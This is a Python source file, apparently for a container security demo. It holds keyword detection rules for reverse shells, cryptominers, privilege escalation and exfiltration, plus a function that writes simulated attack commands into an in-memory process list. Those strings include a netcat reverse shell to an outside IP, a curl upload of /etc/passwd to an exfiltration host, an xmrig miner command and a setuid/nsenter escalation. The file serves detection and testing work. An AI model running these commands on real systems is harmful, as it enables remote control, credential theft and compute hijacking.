import time
import logging

logger = logging.getLogger("threat_engine")

THREAT_PATTERNS = {
    "REVERSE_SHELL": {
        "rule_id": "RULE-101",
        "name": "Rogue Interactive Reverse Shell Spawning",
        "severity": "CRITICAL",
        "risk_weight": 95.0,
        "keywords": ["/bin/sh", "bash -i", "nc -e", "netcat", "python -c import socket", "ncat", "socat", "perl -e"]
    },
    "CRYPTOMINER": {
        "rule_id": "RULE-102",
        "name": "Cryptomining Hijack & Resource Exhaustion",
        "severity": "HIGH",
        "risk_weight": 85.0,
        "keywords": ["xmrig", "minerd", "cpuminer", "kdevtmpf", "stratum+tcp", "monero"]
    },
    "PRIVILEGE_ESCALATION": {
        "rule_id": "RULE-103",
        "name": "Root Mount Tampering & Capability Abuse",
        "severity": "CRITICAL",
        "risk_weight": 90.0,
        "keywords": ["/etc/passwd", "/etc/shadow", "chmod +s", "nsenter", "docker.sock", "CAP_SYS_ADMIN"]
    },
    "OUTBOUND_EXFILTRATION": {
        "rule_id": "RULE-104",
        "name": "Unapproved Data Exfiltration to Malicious IP",
        "severity": "HIGH",
        "risk_weight": 80.0,
        "keywords": ["185.220.101.", "194.26.29.", "evil-exfil-webhook.com", "tor-exit-node"]
    },
    "FILE_INTEGRITY_TAMPERING": {
        "rule_id": "RULE-105",
        "name": "Unauthorized Executable Drop in /tmp",
        "severity": "MEDIUM",
        "risk_weight": 70.0,
        "keywords": ["/tmp/payload.sh", "/tmp/.rootkit", "/var/tmp/.malware", "chmod 777 /tmp"]
    }
}

def analyze_container_threats(container_info: dict) -> dict:
    """Scans container runtime process tree, logs, and network state for security threats."""
    container_id = container_info.get("container_id", "unknown")
    name = container_info.get("name", "unknown")
    processes = container_info.get("processes", [])
    cpu_pct = container_info.get("cpu_usage_pct", 0.0)

    alerts = []
    max_risk = 0.0

    # 1. Inspect Process Tree
    for proc in processes:
        proc_str = str(proc).lower()
        for threat_key, pattern in THREAT_PATTERNS.items():
            for kw in pattern["keywords"]:
                if kw.lower() in proc_str:
                    max_risk = max(max_risk, pattern["risk_weight"])
                    alerts.append({
                        "rule_id": pattern["rule_id"],
                        "threat_type": pattern["name"],
                        "severity": pattern["severity"],
                        "details": f"Matched process signature '{kw}' in process '{proc}'"
                    })

    # 2. Inspect CPU Resource Spikes (Cryptomining Anomaly)
    if cpu_pct > 85.0:
        max_risk = max(max_risk, 85.0)
        alerts.append({
            "rule_id": "RULE-102",
            "threat_type": "Cryptomining Hijack & Resource Exhaustion",
            "severity": "HIGH",
            "details": f"Abnormal CPU consumption spike detected ({cpu_pct}% CPU)"
        })

    # Determine Container Security Status
    if max_risk >= 70.0:
        status = "COMPROMISED"
    elif max_risk >= 30.0:
        status = "SUSPICIOUS"
    else:
        status = "HEALTHY"

    return {
        "container_id": container_id,
        "name": name,
        "threat_status": status,
        "threat_risk_score": max_risk,
        "alerts_count": len(alerts),
        "active_alerts": alerts,
        "timestamp": time.time()
    }

def inject_simulated_attack(target_container_id: str, attack_type: str, system_containers: dict) -> dict:
    """Injects a real simulated attack scenario into a target container for self-healing demonstration."""
    if target_container_id not in system_containers:
        return {"success": False, "message": f"Container {target_container_id} not found."}

    cntr = system_containers[target_container_id]

    if attack_type == "reverse_shell":
        cntr["processes"].append("/bin/sh -c nc -e /bin/bash 185.220.101.4 4444")
        cntr["health"] = "COMPROMISED"
        msg = "Injected interactive reverse shell process '/bin/sh -c nc -e /bin/bash 185.220.101.4 4444'"

    elif attack_type == "cryptominer":
        cntr["processes"].append("./xmrig --url=stratum+tcp://monero.pool:3333")
        cntr["cpu_usage_pct"] = 94.6
        cntr["health"] = "COMPROMISED"
        msg = "Injected XMRig Cryptominer process and spiked CPU to 94.6%"

    elif attack_type == "exfiltration":
        cntr["processes"].append("curl -F file=@/etc/passwd http://evil-exfil-webhook.com/upload")
        cntr["health"] = "COMPROMISED"
        msg = "Injected unauthorized data exfiltration command to external webhook"

    elif attack_type == "privilege_escalation":
        cntr["processes"].append("chmod +s /tmp/payload.sh && nsenter --target 1 --mount")
        cntr["health"] = "COMPROMISED"
        msg = "Injected privilege escalation and root mount tampering attempt"

    else:
        return {"success": False, "message": "Unknown attack type"}

    return {
        "success": True,
        "container_id": target_container_id,
        "attack_type": attack_type,
        "message": msg
    }
